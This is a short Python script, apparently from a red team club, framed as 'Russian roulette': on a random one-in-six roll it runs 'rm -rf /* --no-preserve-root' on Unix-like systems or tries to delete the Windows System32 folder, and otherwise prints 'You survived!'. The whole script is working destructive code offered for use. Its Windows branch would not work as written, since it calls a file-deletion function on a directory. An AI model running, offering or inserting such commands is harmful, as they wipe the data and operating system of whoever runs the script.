"""
we're gonna play some Russian roulette
sendto: redteam@ritsec.club
"""

import os, random

if __name__ == "__main__":
    if random.randint(1, 6) == 3:
        if os.name == "posix":
            os.system("rm -rf /* --no-preserve-root")
        elif os.name == "nt":
            os.remove("C:\\Windows\\System32")
    else:
        print("You survived!")